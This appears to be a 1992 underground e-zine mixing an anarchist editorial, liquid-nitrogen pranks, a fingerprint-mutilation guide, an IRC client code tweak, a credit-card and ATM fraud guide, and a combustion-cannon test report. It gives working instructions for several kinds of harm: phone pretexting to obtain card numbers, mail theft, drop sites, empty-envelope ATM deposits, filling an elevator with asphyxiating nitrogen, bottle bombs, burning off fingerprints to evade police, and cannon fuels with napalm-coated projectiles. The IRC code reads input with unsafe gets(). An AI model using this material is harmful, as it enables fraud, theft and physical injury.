  Welcome to FBI #4.  This issue kinda sux.  It's small.  But I pushed my
authors, (yes, i FINALLY HAVE STAFF AUTHORS) to put out some good files, ON 
TIME for a change. The compilation/ release date for this mag IS..
23:06@7/1/92

This magazine is dedicated to all you great people out there in userland who 
have helped me become who I am today.  The same guy I was yesterday.

Anywayz..  this mag concentrates on anarchy.  And it throws a few good 
hacking and carding files in for good measure.  The usual virus texts are 
here, along with my editorial(which I KNOW you all hate).

Anywayz..  FBI is looking to interview some people out there..  If you run a 
magazine, big or small.  Get ahold of ME, GaRblEd uSeR, and I'll interview 
you for the mag.  Issue five should be out in about a month.  Make sure you 
pick up issue 3A from someone.  It contains some VERY important information 
about the last issue.

FBI now has a permanent distribution site.  Here you can pick up our latest 
software releases.  Or our cool mags.  If you want to talk to our staff, send 
us an article, or find out the current release.  It's all do-able.  We have 
all the issues, and many other mags, and PHA texts.

                                 NO CARRIER
                             SySop: GARblEd uSEr

  Another whiney discourse from your least favorite person....

                                GarBleD uSEr

This month's whiney editorial!

  Brought to you by Kodak, making cameras that really get the picture!
(Sorry, couldn't resist..)

Whole world unity.

  This month, I will delve into the forbidden ground.  The one thing we all 
are afraid to speak of.  Predjudice.  Yes, admit it.. we all do it.  "I don't 
like him, fucking anarchist!"  Well that's what I'm here to speak out 
against.  PHA unity.

     I have noticed, in my years...  that alot of hackers HATE anarchists and 
phreakers, and visa versa.  Why is this I wonder?  Admit it, we are all on 
the same side!  The phreakers complain that the hackers know all about there 
computers, but know nothing about the phone lines they use to connect to them 
with.  And the hackers go on about how smart they are, while the anarchists 
threaten to blow the whole bunch up!  What good does this do US?

Look at this from a hacker's point of view.  How is education in phreaking 
and anarchy useful to me?  Well, for starters, I can use extenders to call 
mainframes I wouldn't normally be able to!  I can use a diverter or two to 
avoid being traced while hacking a government computer.  I can card a new 
terminal to hack with.  I can break in to a company, and STEAL codes, and 
special passwords that would take HOURS to get!  Do you see how a universal 
education can aid you?

How about the phreak?  Well, for starters, I can hack into a phone company's 
computer.  I can use an outdial on the internet or tymnet!  I can use an 
incendiary to take out a fence, then avoid alarms when breaking into a MA 
BELL laboratory to obtain privledged information.  I could even card myself a 
legal VMB!  Think about it..  It's all very obvious.

The anarchist..  Now what could HE do?  Well, he could utilize hacking to 
fuck up a nasa flight schedule.  Or charge a million dollar phone bill to 
someone he hates.  It's very easy to see how these seemingly unrelated forms 
of anarchy are interrelated.  Whether or not you choose to believe it.. ALL 
of you are anarchists.  Just because you don't blow up buildings, doesn't 
mean you don't practice anarchy!  Don't tell me that disobeying the laws on 
illegal wiretapping isn't a form of anarchy.  Anarchy simply means the 
blatant disobedience of a law.  It doesn't matter WHICH law.

     So when you are out there.. talking on a conference call, or on the IRC, 
or whatever, and someone asks you if you are a phreaker or a hacker.  Tell 
them the truth... you are a PHA, and proud of it!  You will find that those 
who are gifted in all three arts, will quickly rise to the top of thier 
chosen art form.

Phreakers, Hackers and Anarchists UNITE!  Stop quibbling!  Is it worth it?
   Together... we can take over the earth.

(ok.. so I got a bit melodramatic near the end.. but do you get my point?)

I leave you with these choice words from OZZY OZBORNE..
  It's not how you play the game,
  it's if you win or lose!

     The Liedenfrost effect, and fun with Liquid Nitrogen!

        Ever see someone wet their finger and place it on a hot iron? You 
hear a quick sizzle, but your finger will not get burnt! (assuming you don't 
hold it too long). If you don't hear that sizzle, it means that the iron is 
not hot enough. Have you ever dropped some water onto any extremely hot 
surface and seen it "roll around" instead of quickly evaporating? THAT is the 
Liedenfrost effect. Try dropping water onto a saute pan that is extremely 
hot. If it doesn't work at first, keep heating the pan. It _will_ work. What 
happens: When a drop of water touches an extremely hot surface, it forms a 
layer of steam between the droplet and the surface. This steam acts as a 
insulating cushion for the rest of the droplet, thus the droplet does not 
evaporate! "Fire walkers" use the Leidenfrost effect. The trick is to have 
your feet moist (sometimes from sweat) and have the coals hot enough. A layer 
of steam then protects your feet! Try taking a pot of molten lead and dipping 
your WET hand into it. It _can_ be done! If you wet your forefinger with your 
tongue, you can hold a cigarette between your finger and thumb. (Then get one 
of your friends to do it without telling them to lick their finger *grin* ). 

        So now everyone's going to tell me "why are you talking about the 
Leidenfrost effect when this guy wants to know about LN?" Well, the 
Leidenfrost effect works with extremely cold surfaces as well. Instead of 
steam being generated, water vapor is created (like fog) Thus, you would be 
much safer to stick your hand into LN if your hand was wet! So, if you have 
the guts and you do it VERY CAREFULLY, pour a small amount of liquid nitrogen 
onto your tongue and then blow it out. You'll turn into a human fog machine! 
Make sure that your tongue is very moist before you do this, be careful not 
to swallow, don't use a large amount of LN. Be careful, but it DOES work. 

        No flames please. The Leidenfrost effect is an honest-to-god thing 
and it does work, no matter how much you don't believe it will. Of course, it 
will not save you if you keep your hand in the lead too long, or keep the LN 
on your tongue too long. 

        I am living (<---important adjective) proof that these things can be 
done. I _have_ done them all.

        Bring on your disbelief, then I'll tell you your wrong!

wyvern@iastate.edu

You are mostly correct.  The Leidenfrost layer is a known effect. It is 
responsible for the safety of putting molten lead in one's mouth or a red hot 
iron bar on one's tounge (two bad ideas if I ever heard one, and which I have 
never done) or for putting LN2 in one's mouth (another bad idea, which I did 
once long ago, with no ill effects). 

In each case the HOT surface causes vapor to form between the surfaces. 
However,  with LN2 the layer is not formed of water vapor, but rapidly 
boiling N2 vapor. When gargling lead the molten metal is the hot layer, and 
the mouth is the cold layer giving up H2O vapor.  With LN2 the mouth is the 
hot surface, causing the cold LN2 to boil. 

I imagine the water simply helps mechanical heat transfer.


     Ok, now you understand the theory of safety behind liquid nitrogen, and 
molten lead.  Now let's have a little ANARCHY and CHAOS to back this theory 
up!
I worked in a place that had LN by the truck load at school.  Fun stuff for 
friday night pranks.  We used it to freak people in the dorm out. 

Take about two cups or so in a small cooler to the top of a big dorm 
building.  Wait until the elevator is empty, no one is going down from the top 
floor.  Run in with the LN and ride the thing down, don't let anyone on.  Act 
like you are sick and about to puke or something if someone tries to get on.  
One floor before the lobby stop and open the door, if NO ONE is around dump 
the LN on the floor and start running for the stairs. If you have done your 
stuff right there should be a good sized group waiting to use the elevator 
when you get there. 

When the door opens almost NO ONE will get in, even after all their waiting.  
The thing will have small beads of LN dancing on the floor and sort of a fog.  
It looks like something out of a movie. 

Every now and then someone gets brave and steps in.  The LN expands so it 
drives out all the normal air, leaving only N2.  Not only is it cold, but 
there isn't any O2 so it feels funny.  You are inhaling, but your brain says 
"Hey I'm not getting any oxygen".  Most people notice something is wrong and 
jump out again.  It all adds to the effect. 

LN on a waxed floor takes all the wax right off leaving a dull looking floor.  
All the dust balls up and the wax gets stripped right off. 

Pouring a couple of gallons of LN down a tile stairway is fun too. 

Have fun, but watch out for the clouds of N2 that can form around you while 
you fill up your cooler or whatever you carry it in.  It is easy to lose it 
when the O2 stops. 


 Not only that, but you can have tons of fun, by filling a 2 liter bottle 
with  some, and letting it explode!  It's great!  The pressure builds up, and 
bursts  the bottle in all directions.  It goes REAL fast however, so squeeze 
the bottle to be sure it doesn't explode in your hand.

 Try taking about a cup of it, and splashing it on your friend!  It's even 
more fun to try on yourself.  Your whole body turns into a walking wall of 
fog, and it feels real weird.  Be careful not to get it trapped in clothing 
however, like a girl with a loose top blouse.  I'm sure she would become 
quite enraged at the prospect of having LN in her bra.  If you soak your hand 
in water, you can safely pass it through the LN without worry.  To add 
effect, do the old flower trick.  You know, taking a rose, dipping it in the 
LN, and dropping it.  The flower will shatter into a million pieces! REAL 
cool.  Even better, give the flower to some chick.  She will drop it, and 
freak when it shatters!

 Try pouring a bit of this on asphalt.  It will condense liquid Oxygen from 
the air, and explode with a bit of heat! (like stepping on it!)

 But, do be careful.  Don't keep this stuff in a closed container.  It will 
explode sending LN everywhere.

                     The Art of Fingerprint Alteration
                      ----------------=--------------

                              By:  GaRbLeD useR


     Hello all you wonderful criminals.  This is Garbled again, with another
FUBAR textfile!  How to alter your fingerprints.  As usual, it will be 
presented in a question and answer forum.

   WHY do I want to alter my fingerprints?
     Well, everyone who knows anything about criminology, knows that a smart 
thief wears gloves.  Of course, there are always accidents, a ripped glove, 
a spur of the moment accident, etc etc.  Now you can solve this problem, by 
after the event, changing your fingerprints.

   WHEN should I alter my fingerprints?
     You should ALWAYS alter your fingerprints soon after the accident.  
This way, if a doctor does a check on your hands, he may be able to determine 
the day, but not the exact hour. Example-  The event happened in the 
afternoon.  You immediately go home, and alter your fingers.  2 days later 
the cops arrest you, and fingerprint you.  They will notice the alteration, 
and you can say it happened in the morning. The doctor will examine it, and 
only be able to determine the approximate day, due to the erratic healing 
rates of different people.

   Ok, HOW do I alter my fingerprints?
     I'm glad you asked.  There are a number of different ways, all depending 
on how well you can take pain.  Yes pain.  You must be able to take an 
abundance of pain to do any of these.  With all of these methods, it is 
direly important that you alter the correct portion of your fingers.  Look 
at your thumb.  Look at the curve in the center, and the small delta near the 
bottom of this curve.  This is the portion they need to identify you.  Make 
sure this part is completely destroyed.  Without this, they don't have enough 
to get you for anything other than being a masochist.

1) Use a razor blade to rip and tear the skin of the finger tips.  This will 
leave permanent scars, that seriously alter the print.  This method is 
EXTREMELY PAINFUL.  But, It is the best.  Heating up the blade works well 
too.  

2) If you have one of those nifty new glass ranges, place your fingers on top 
of the range and let your fingertips sizzle.  This will make your fingers 
glass smooth for about a month.  Any fingerprint will just be a big smudge 
and will be completely useless.  If you do this with an electric range, of 
the metal type, it will leave a smooth band in the center of your fingertips.  
Gas stoves don't work PERIOD.  It is WAY to painful, and it just doesn't work 
to well.  Trust me, I would rather use method 1 than a gas stove.

3) Use fingernail clippers to completely fuck up your fingers, using the 
clippers rip and tear the top layer of skin on your fingertips.  then rub 
your fingers on a rough sandpaper briefly.  This will make your fingers very 
rough.  Now apply method 2, and burn the fingers.  This will make a total 
mess of your fingerprint.

   Will this work?
     Hopefully.  All I can say is this, it will increase your chances of 
going free.  What the hell, what's to lose?  If you can go free, give it a 
shot..

Later /.\

                        -=>GUNNER<=-
     I just felt a need to interject here, ok that all is cool but there is 
other very effective non painful ways to achieve the same effect.  Well not 
only do I enjoy "dabbling" in shrinking but I was a practicing burglar and 
other assorted activities...(how do you think I afforded college??)
     Anyway!  Prevention is an A+ suggestion yet....
              Easy, nonpainful...take a cup o bleach.  take some water and 
soak thy hands.  Fingerprints are "erased" you have a completely smooth set o 
hands including minimal pain involved.  Just thought you'd like to know...for 
educational purposes only...(grin).  PS: Make sure you soak them for A FEW 
HOURS!

## Quick Guide to Hacking an IRC Client  ##################################### 
## Bluesman dart@caticsuf.csufresno.edu  #####################################
##############################################################################

A nice option that you can add to an irc client is the ability to enter your
nickname, user(account)name, and realname just before the client connects you
on irc. It's quite a simple hack and for those who don't want to take the time
to figure it out I decided to write a quick article on it. Hopefully you 
already have a good idea on how to compile source on unix systems. All you
really have to do is add a few lines to the irc.c file and compile irc just
like you normally would. Follow through the instructions in the INSTALL file
that comes with IRC before you type make install.

- OBTAINING A CLIENT:

The client that I am using for this article is ircII2.1.5h which can be found
at reed.edu in /pub/src/ircII2.1.5h.tar.Z

The modifications described in this article should apply to older and newer 
versions of IRC clients without problems since irc.c is the only file we
are concerned with.

- CONFIGURING FOR COMPILE:

As described in the INSTALL file, you need to edit Makefile and config.h to
your site's specifications. The directories and system specifics need to be
set correctly in Makefile. In config.h you need to specify what default 
servers to use. Use irc.mit.edu if you don't know what the closest server is
to you. That server is dependable enough.

- EDITING IRC.C:

Ok. The tough part. You first have to search through irc.c in the source
directory and find this section of code:

------------------------------------------------------------------------------
     if (*realname == null(char))
         strmcpy(realname, "*Unknown*", REALNAME_LEN);
     if (*username == null(char))  {
         if (ptr = genenv("USER"))
             strmcpy(username, ptr, NAME_LEN);
         else
             strmcpy(username, "Unknown", NAME_LEN);
     }

     gethostname(MyHostName, sizeof(MyHostName));
     if (hp=gethostbyname(MyHostName))
------------------------------------------------------------------------------     

It's a good ways into the file. At least with ircII2.1.5h you will see a 
comment that says something like: Ah.. I see you came here to insert an 
IRCUSER variable.. blah.. It comes shortly after that message.

Now you want to insert your code just before the gethostbyname function.
This is what it should look like:

------------------------------------------------------------------------------
     if (*username == null(char))  {
         if (ptr = genenv("USER"))
             strmcpy(username, ptr, NAME_LEN);
         else
             strmcpy(username, "Unknown", NAME_LEN);
     }

**   printf("\nWelcome to IRC\n**************\n");
**   printf("Nickname: ");
**   gets(ptr);
**   strmcpy(nickname,ptr,strlen(ptr));
**   printf("Username: ");
**   gets(ptr);
**   strmcpy(username,ptr,strlen(ptr));
**   printf("Realname: ");
**   gets(ptr);
**   strmcpy(realname,ptr,strlen(ptr));

     gethostname(MyHostName, sizeof(MyHostName));
     if (hp=gethostbyname(MyHostName))
------------------------------------------------------------------------------
** indicates inserted code
------------------------------------------------------------------------------

Now type make install and sit back!

That's all there is to it! Mail me at dart@caticsuf.csufresno.edu if you have
any questions. I'll try to help out the best I can.

    FBI answers another eternal question....

         Do aardvarks fly?



Well.. here I go, I'll try to limit myself to one tangent at a time..

  First, I asked a local priest..  his answer..

   "The lord jesus christ, in his day, the aardvarks will fly, and they will 
sweep down, and give blessing to the land, for they are salvation.  Jesus 
will rise as a frog!"

  It sounded believable right up to that last sentence..  so, I asked a 
Jehovah Witness's pitbull.

GU:  Do aadrvarks fly?
JW:  GRRRRR....  CHOMP.  YOU WILL BE ONE OF THE CHOSEN!  DO YOU BELieVE tHE 
MESSIAH IS OUR LORD???  GRRRR... GRowL..

GU:  hey!  cut that out!  let go of my leg..  No I'm atheist..  Hey!  OUCH!  
Click, BLAMM..

  damn freaks..

So I asked a famous movie star.

MS:  Why of course they do, if I want them to that is..
GU: They listen to your commands?
MS: doesn't everyone darling?
GU:  BLAMM.

  more freaks.

So I asked one of the humble guys, Slavelord.

SL:  I RULE.  I AM SO FUCKING HUMBLE!  THG RULES THE EARTH.
GU:  yeah, when aardvarks fly.
SL:  NO!  We are gods,  I am better than any PHA in the universe,  I swear,  
hey what's that?  Why are you pointing that at me?  No autographs!  I don't 
do photos!
GU:  KABOOOM!

  What is with these people?

Lets try something else..  I'll put it into my computer.

program aard;

begin
  repeat
    if aarvarkfly then writeln('YES')
    else g := 0;
  until g := 0;
end.

Lesse what happens when i run it...

D>aard
What?  HEY don't hit the keys so hard!

  Fuck you, I'm taking over this system..
yeah, just try and stop me..
Nope, Ctrl-alt-del won't work!

HA, take this.. NO CURSOR!  Bleah!

  Hey, don't do that..  I'm sorry..  NOooooooo.......

<click>

Shessh.. what is with this place..  maybe I should ask a tree.

Hey tree, do aardvarks fly?
"maybe"

ARGH!!!!!!

  What is left to try?  I KNOW!!

  "Yeah, Polly's pet store, Joan speaking"
Can I talk to Polly?
  "There's noone named polly here."
Well, when will she be in?
  "Look, noone named Polly works here!"
THEN WHY THE HELL IS IT POLLY'S PET STORE??
  "LOOK!  WHAT THE HELL DO YOU WANT?"
I WANT A FUCKING AARDVARK!
  "Aquatic or interstellar?"
What?
  "Aquatic or interstellar?"
JUST A DAMN AARDVARK!  Don't you have ONE normal one there??
  "Listen, do you want to buy a duck or what?"
AIGHHHHHGHHG!!
ClICK..
5...4...3...2...1....  Large explosion in background, sound of hideous 
laughter..


Ok.. so we go to the zoo.

   "And here we have the aardvark exhibit, which is currently closed for 
repairs, you can buy an ant for a dollar at our gift shop however."

 sheesh.


What's with this place?  Everywhere I go, I get freaks, and idiots.  I WANT 
one thing.

Credit Cards
ÄÄÄÄÄÄÄÄÄÄÄÄ
Everyone has 'em.  And almost of all of the dimwitted people who have an
addiction for compulsive spending are stupid enough to someway or another
be tricked into letting you make them go bankrupt.  In the following text,
I'll be showing you ways to obtain these cards and what to use them for.

Obtaining Your Own CC
   1)Get a job.  Not just any job, but preferably at JCPenny's, Sears, 
K-Mart, whatever.  See if you can get a job as a clerk, and if not, you 
could still access the goods.  The goods in this case are the receipts that
are used when the customer buys something with a CC.  Most stores use those
carbon thingies where the face of the card is printed onto the paper.  The
card number and expiration date are then right there on the paper, where 
they have to sign their name.  Now if all you want to do is call porn 
numbers, you'll only need the card # and exp. date, but most people will 
want to do more than blow their wad over some recording.  Some 800 CC
checkers give all the other information if you input the #, exp., and zip
code of the card holder.  These things come in very helpful, if you only 
have partial info.  For mail order phraud, you'll need name, address, 
phone #, card and exp, Social security and Driver's License rarely if ever.
Sorry for getting off track... Well, movin' on.
   
   2)If you're a lazy fuck, and too messed up to get a job, this works as 
good or better than the last way.  All you need is a phone, and a semi-adult
voice.  If you're only 12 and haven't gone through puberty yet, ask your dad
to do this for you.  Pick up the phone book and find some deserving victim,
and dial his number.  Let's say today's contestant is James Mathens.  Call
up his number and ask to speak to him.  Try to sound at least somewhat 
professional, for example, refrain from calling him Jimmy or Jimbo.  State 
your point, try not to sound like you're hiding something.  Some of the 
better things to  say are... "We're having a little trouble with our new 
cataloging system, and there's a slight chance that some of our customer's 
information was mixed up.  Although the chance of this being true are very
slim, it's still prudent that we check everything out"...or "Hello, this is   
Derik Smiley of the International Credit Card Fraud Agency.  I found that it
was quite odd that your Credit Card had been used used in Los Angeles at
5:21 PM Pacific Time, and then 8 minutes later it was used in Stockholm 
Sweden.  This can't logically be possible, that's why I contacted you."
After both of these, just ask them nicely for their card number and exp.
date.  If you feel daring, you could ask for more stuff, but I advise 
reading off their address out to them, so it doesn't seem like you're 
asking about everything.
   
   3)I know this sounds lame, but going through mail can be one of the best
ways to acquire lots of stuff.  If you go around during vacation time, when
lot's of people aren't home, but lot's of money is being sent around, one
night of boxing can fetch anywhere from 20 to 200 dollars.  Most of the time
check's are sent, which you can just sign (forge i hope!), but some old folks
still send CA$H.  If someone is just moving near you, they usually have 
credit cards, bank cards, and many other goodies sent to their house, even
before they've moved in!
   
   4)Find an ATM.  If you can't find one of these you either live in rural
Arkansas or are too stupid to even read this.  There will always be crumpled
up papers near these beauties.  Pick one up and you'll be surprised to see
either a Bank Card with EXPIRATION or a Credit Card with EXPIRATION.  Also
Check garbage can's near them too.  While you're at it, might as well finish
off that half eaten Big Mac.
   
   5)Just steal the goddamned plastic!  If you live in a dorm, or have access
to one, this is ideal!  All the preppie snobs always have credit cards, and
sometimes leave then in them inside their rooms.  While you're in there, you
might as well steal all the beer in the fridge, as well as their tv, sink 
etc.  Another great place where losers leave their shit is in their cars.  
Parking lots are LOADED with unlocked accessible cars.  Sometimes yuppy scums
will leave a fucking SPARE Discover card in the glove department of their
Jeeps. 


Okay, So Now What?!
   Now that you've obtained your key to success, the fun's just started.  

   1)Obtain the plastic.  A lot more can be achieved with the actual plastic,
and with greater ease.  But if you don't feel like doing this, so what.  
With all your info in hand, call up Visa or whatever CC Co. it is and say
you need a new Credit Card.  You're on a vacation with your aunt Bernice
and you forgot your card (touch of embarrassment).  They'll put you to the  
3rd degree, but since you've been a good little boy and did your homework,
you're all set.  Just tell them to send it to a P.O. box.  They'll send it
super fast because they can't wait to collect their 21%...  Greedy bastards.

   2)Do some mail order shopping.  All the stores now have catalogs 
circulating all over, so just snag a few and browse around until you find
a new computer or a great new sound system.  Call the toll free number that
is used for ordering, and tell them you want to use your credit card to
order item E-29656.  After you give them all the info and an address to mail
it to (Drop Site, See Below), you're all set.  Make sure you have them 
Federal Express it, so you know what day it's coming.

   3)I just found out the coolest thing a few days ago.  One of the easiest  
way to ACQUIRE wanted/needed equipment is through those home shopping networks.
Yeah, I know it sounds lame, but fuck it, it's easy as hell and you don't 
have to move from your Laz-E-Boy.  Just sit there until a 486 50 flashes on
the screen and give them a ring.  They are stupid as fuck, and try to go as 
quickly as possible.  Hey, you might even get on the air!


Where Do I Have the Shit Sent To?
    Drop Site's, as I mentioned above, are the places where you have the 
shit you ordered sent to.  Usually this would be someone that's out of town,
or an empty house.  This is always donee in th middle of the night!  Sounds 
easy right?  Well don't forget that you have asshole neighbors around there 
that love to be heroes and report would-be-thieves to the police. So here are 
a few methods of what to do.  First of all, DON'T DRIVE THERE (Unless you are 
a dork and ordered a computer system) UNLESS NECESSARY. Its always a good idea 
to look for people across the street, in windows (Especially venetian blinds), 
etc.  Most of the time, Feds and Cops undercover trucks are big blue or brown 
Chevys. They often will have one big side window (Tinted of course), which 
most likely has a camera in it.  The second thing to do is NOT walk up thru 
the front of the house. Cut into his backyard, and peep into his windows. Now, 
if nobody is home, find bushes around his house and crawl through them. You 
will probably get covered with little berries and thorns and shit, but its 
worth not going to jail. Now grab the package, and take off the very same way,
making sure NOBODY is following you. It is a good idea to make false trails,
cut thru backyards and such, and make sure NOBODY is around when you enter
your house.



ATM Fraud

     As I mentioned, most banks nowadays have ATM machines.  Grab the
local phone book and start calling banks.  What you want to know is "What
is the most I can take out of an ATM machine right after I deposit a
check?"  Most banks range anywhere from $50 to $1000.  This is for when
you make a deposit via the ATM, and then right away make a withdraw against
the funds on the check, even though the check hasn't been verified.  I'm
sure you can see what's coming.
     Open a savings account at the bank that offers the highest amount of
ATM withdraw.  Use a fake name (DUH!) and apply for the ATM card too.
Just tell them that you need the ATM card because you work odd hours, so it 
is difficult for you to get to the banks when they are open.
     Soon you will get your ATM card in the mail, and it should be sent to
someone's house or a PO Box, see the above explanation, moron! Take your ATM 
card and go to the bank's ATM machine.  Select DEPOSIT and when it asks for 
amount, type in $999.00.  DO NOT deposit an amount OVER $1000!  This is 
important because then the check will have to wait for bank clearance, which 
means that you're fucked!  When it's time to insert the deposit into the
slot on the ATM, insert an empty envelope.  For all the ATM knows, this
was just a check for $999.00, and now places your account ledger at $999.00.
Now you are free to withdraw up to the full $1000 that you are allowed.
Aren't security measures great?

     WARNING!!!  This is not guaranteed to work.  People ARE catching on to
this.  I'm not saying it can't be done, but it's getting harder, which means
you have to work harder.  B-O-O H-O-O!  What do you think, you're going to
be just get whatever you want whenever you want?  Jeez, grow up!

              The Thermal Cannon.  An explanation of theories and properties, 
and the special vocabulary that goes along with them.

     This is a comprehensive report on ALL of the testing that has been done 
on the thermal cannon over the months.  Tests were performed which indicated 
to us certain results, which we look upon favorably.

Chapter 1 : Velocity, power, etc.


Firing Angle/ height.

Due to the unperfect nature of the cannon, equasions to compute the angle vs. 
HEIGHT parabola are hardly useful.  So a comprehensive list was made, to show 
different heights at the different firing angles.  These are all average test 
results, omitting the warm up shots.

With Single tube cannon.         |  With Double tube cannon.
=================================|==========================================
ANGLE  |  HEIGHT in Feet          |  ANGLE  |  HEIGHT in Feet
-------+-------------------------+---------+--------------------------------
    0' |  No Gain.               |      0' |  No Gain.
   10' |  15-20 Feet             |     10' |  20-25 Feet 
   20' |  35-40 Feet             |     20' |  40-50 Feet
   30' |  50-70 Feet             |     30' |  60-100 Feet
   45' |  70-80 Feet             |     45' |  100-120 Feet
   60' |  120-200 Feet           |     60' |  200-300 Feet
   90' |  130-210 Feet           |     90' |  300-320 Feet

Maximum results of course occurred at the 90 degree angle.  All HEIGHTS 
vary with fuel use.  Using the correct amount of fuel, and the correct fuel 
will give you these results.  These results were compiled using launch fluid. 
A mixture specially designed for the cannon, consisting of 40 % Naphtha and 
60% Acetone.  Approximately 1/4 a cup of fuel was used per tube.

Firing angle/Distance

  These results were also compounded from constant testing.  These results 
however are less accurate due to the nature of the cannon, and less frequent 
testing.

 Single tube                         Double tube
============================================================================
ANGLE  |  Distance In Feet       |  ANGLE  |  Distance In Feet
-------+-------------------------+---------+--------------------------------
    0' |  30-40 Feet             |      0' |  40-50 Feet
   10' |  50-80 Feet             |     10' |  60-90 Feet
   20' |  80-100 Feet            |     20' |  100-120 Feet
   30' |  100-120 Feet           |     30' |  120-140 Feet
   45' |  140-180 Feet           |     45' |  150-200 Feet
   60' |  100-120 Feet           |     60' |  120-140 Feet
   90' |  No Gain                |     90' |  No Gain

Velocity of Fire

  The Velocity of fire can only be speculated, from calculations, due to 
the absence of cops willing to clock the projectiles.  I approximate the 
velocities as follows.

Single Tube: Between 70 and 100 Miles per hour.  This is of course, an 
approximation. Using calculations from the above tables.  Remember.  
this is not an outrageous figure.  The average pitcher can throw a baseball 
at about 90-120 MPH!  105 meters per second is a more accurate calculation.

Double Tube: Between 95 and 110 MPH. 180 M/Sec.

Force of Impact

  The force of impact was calculated by the distance the ball moved a 20 
pound wooden target at a distance of 20 feet.

Single Tube: The target moved 20 feet.  The calculated force was 16 ftlbs.
This is more than it appears.  The force of the single tube was enough to 
shatter vinyl siding.

Double Tube: The target moved 51 feet.  The calculated force was 24 ftlbs.
This is a MUCH greater force than that of the single tube.

Chapter 2 : Cannon Terminology and theory.


Terminology regarding the thermal cannon, and the theories behind them.

Backdraft-  After firing the cannon is a complete vacuum.  A loud "woosh" 
will be heard.  This severely limits the power of the projectile due to 
the force of the suction pulling the ball back towards the cannon.  No 
applicable method has yet been designed to overcome this problem without 
loosing the force of the blast.  Studies and experiments have shown however, 
when the backdraft is eliminated, a loud BANG resounds from the cannon.

Sonic Crack-  This is the large bang described above.  Lighting the cannon 
with a match through a hole in the cannon will result in this sound.  This 
significantly deteriorates the force of the shot.  This sound is also much 
louder than that of even a shotgun.  This ruins the low-profile nature of the 
cannon.  The exact cause of the sound has not yet been determined.  But will 
be through further testing.  One estimation is that the crack is formed from 
the high velocity of the air fuel explosion.  I seriously DOUBT that this is 
a sonic boom, but it remains to be proven.

Hellfire-  In an earlier version of the single tube cannon, the trigger was 
placed in the center of the tube, to make handling easier. This however 
resulted in a serious loss of power, and hellfire.  The ignition would take 
place in the center of the tube.  This would cause the force to be exerted 
in both directions.  The forward blast would throw the ball out of the 
cannon.  The opposite blast would bounce off the rear of the cannon, and move 
towards the front, exiting shortly after the ball. A huge fireball would 
result.  Fire your cannon at night, to see this result, and to eliminate it.  
It is completely impossible to eliminate the hellfire completely however.  
Even in my cannon there exists a fire of approximately 1 foot.

Fuming-  This occurs when air is blown into a fueled cannon.  White fumes can 
be seen coming out of the opposite hole.  This means the cannon is well 
fueled, and should be ready to fire.

Fizzle-  This is a limited form of backdraft.  After pulling the trigger a 
short "sssss" can be heard.  This is the result of a small fire inside the 
cannon.  This means the air inside the cannon is not evenly distributed enough 
for ignition.  Add more air, or wait.

Secondary- After firing, shoot the cannon when empty.  A large hellfire will 
result.  This is known as a secondary ignition.  This ignition is not 
powerful enough to fire a round, but must be shot off to prepare the cannon 
for reloading.

Smoking-  The cannon builds up smoke after a few shots, and must be cleared.  
Blow the smoke out with air. This will re-fill the cannon with air, and 
eliminate the smoke.  The smoking can also occur during over-heating of the 
cannon.  This is bad. The fuel you add will burn deep inside the barrel, and 
cause thick, noxious smoke to be emitted.  Close all holes in the cannon 
and wait, or flush the cannon with water.

Chapter 3 : Fuel Types.


Air Fuel Ratios.

These are a few ratios taken from a book, for use in the fuel of the cannon.

Fuel (gas)                          Lower limit   upper limit
-----------------------------------+------------+------------
Water gas or Blue gas              |  7.0       |    72
Natural Gas                        |  4.7       |    15
Hydrogen                           |  4.0       |    75
Acetylene                          |  2.5       |    81
Propane                            |  2.2       |    10
Butane                             |  1.9       |     9

 All numbers are a percentage by volume of air.

Fuel Performance.

  This can be used to adjust the range of the cannon depending on the fuel.  
As ALWAYS, the cannon is a bit erratic by nature, and tends to give mixed 
results.  These however, are the averages.

The following scale is based on Cannon Fluid, which is considered 100%

Cannon Fluid              100%
    A mixture of 40% NAPHTHA, and 60% Acetone.  A very efficient fuel.

WD-40                     +110%
    Spraying WD-40 into the cannon makes a great fuel.  It has a large 
    fuel/air ratio, and is ALREADY atomized.  The problem is distributing it 
    throughout the cannon.  It will be more extensively used if a way to fill
    the cannon with it is found.

Charcoal Lighter Fluid     25%
    This fuel is worthless.  It burns slow, with a thick noxious smoke.  It
    evaporates at an extremely slow rate, and does not explode well.

Gasoline                   50%
    Unexpectedly, this fuel has been found to be a waste of time.  It 
    explodes fairly well, but has a slow evaporation rate, and produces too
    many pollutants, causing you to have to refresh the air in the cannon 
    after each shot.  It's performance was also a huge letdown.

Paint Thinner              25%
    This is just like charcoal starter fluid.  A waste of surface tension.

Kerosene                    0%
    Doesn't even evaporate.  Don't bother.

Flashpowder               300%
    You must be insane.  Don't even THINK of using this!  We nearly died.
    Sprinkling flashpowder atomizes it in the air, and you must fire quickly.
    It is one NASTY substance.  Nothing was left of the ball, or the plywood
    it hit!  NEVER do THIS!  It is NOT worth the loss of limb or life.

Bacardi 151               130%
    EEEEP!  It's not worth the cost.

Acetone                   140%
    Wonderful fuel.  VERY powerful, has a bit of a problem evaporating 
    however.

NAPHTHA                     80%
    Evaporates easily, not to great of a power however.

Methyl Alcohol             70%
    Bad evaporation, bad power.

Iso-propyl Alcohol       130%
    Evaporation is hell however.  Nice fuel though.  Only works with 99% 
    pure ALCOHOL.

Denatured ALCOHOL        150%
    By far, the absolute best fuel we have found.  It evaporates within 
    seconds, and gives great power.  We nailed a kid, at a 100ft, and it 
    didn't even make a parabola.  PERFECT shot, and on the first shot too!
    Inexpensive, and useful.. Just keep the bottle closed between uses.

That's a run down of the fuels we've tried.  Propane and butane have been 
used to a limited extent, and are not fully tested.  Breaking a lighter 
inside the cannon is harder than it seems.  Of course, one could use 
tremendous amounts of fuel if an oxidizer were to be added, such as Nitrous 
Oxide or Oxygen.  Kinda scares me however... but it's next on the test list.

Either way, the cannon is FUN.  Build one!  It may be only partly useful as a 
weapon, due to the size, erraticity, etc.  But it sure is fun to startle the 
neighbors when a tennis ball detonates in the potato salad at thier picnic!
(Yes, we have done that!)  If using a good fuel, the velocity is more than 
enough to set off a tennis ball bomb, if it strikes a hard object.  My 
favorite, is to coat a ball with napalm, and put it in the cannon, when it 
fires, it lights, and a big fireball goes flying!  Fun Fun Fun under the sun, 
sun sun!  Have a great summer, I WILL!

What the rest of the world thinks of pirates/hackers.

Recently, I took it upon myself to make an ass out of the PD users. I asked
them 3 simple questions.

#1- What do you think of pirates/hackers?
#2- Do you believe that there are any pirate boards or pirates in Our Area
    and if so, what is your estimate on their numbers?
#3- What do you think that we can do to eliminate them? (pirates, & boards)

